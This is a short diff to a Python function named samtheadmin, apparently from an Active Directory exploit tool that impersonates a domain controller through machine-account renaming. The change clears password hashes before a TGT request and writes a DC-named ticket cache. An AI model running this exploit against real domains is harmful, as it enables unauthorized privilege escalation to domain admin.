@@ -168,8 +168,10 @@ def samtheadmin(username, password, domain, options):
             del_added_computer(ldap_session, domain_dumper,new_computer_name)
             exit()
 
-
-    # Getting a ticket
+    # make hash none, we don't need id now.
+    options.hashes = None
+    
+    # Getting a ticke
     getting_tgt = GETTGT(dc_host, new_computer_password, domain, options)
     getting_tgt.run()
     dcticket = str(dc_host + '.ccache')
